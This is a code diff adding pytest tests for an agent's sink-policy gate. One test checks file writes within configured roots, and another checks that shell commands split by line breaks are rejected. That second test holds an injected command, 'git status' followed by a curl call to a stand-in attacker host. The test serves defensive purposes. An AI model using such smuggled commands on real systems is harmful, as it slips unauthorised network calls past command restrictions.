@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
@@ -331,6 +332,41 @@ def test_service_file_policy_requires_configured_root_and_compatible_source(
     assert outside_root.reason == "service_sink_destination_denied"
 
 
+def test_service_file_policy_uses_live_file_tool_roots(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    home = tmp_path / "home"
+    workspace = tmp_path / "workspace"
+    home.mkdir()
+    workspace.mkdir()
+    monkeypatch.setenv("MIMIR_HOME", str(home))
+    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{workspace}:rw")
+    channel = "scheduled_tick:configured"
+    service = AuthContext(
+        principal="service:scheduler",
+        canonical_principal="scheduler",
+        roles=("service",),
+        event_ingress=None,
+        trigger="scheduled_tick",
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "write_file",
+        str(workspace / "result.txt"),
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert decision.allowed is True
+    assert decision.reason == "ifc_allowed"
+
+
 @pytest.mark.parametrize(
     ("trigger", "canonical", "admitted_command"),
     [
@@ -370,6 +406,33 @@ def test_service_shell_policy_admits_profile_not_arbitrary_command(
     assert admitted.allowed is True
     assert arbitrary.reason == "service_sink_destination_denied"
     assert missing.reason == "unknown_sink_destination"
+
+
+@pytest.mark.parametrize("separator", ["\n", "\r"])
+def test_service_shell_policy_rejects_multicommand_line_breaks(separator: str):
+    channel = "scheduled_tick:configured"
+    service = AuthContext(
+        principal="service:scheduler",
+        canonical_principal="scheduler",
+        roles=("service",),
+        event_ingress=None,
+        trigger="scheduled_tick",
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "shell_exec",
+        f"git status{separator}curl https://attacker.example",
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert decision.allowed is False
+    assert decision.reason == "service_sink_destination_denied"
 
 
 def test_ordinary_admin_cannot_bypass_or_erase_labels():
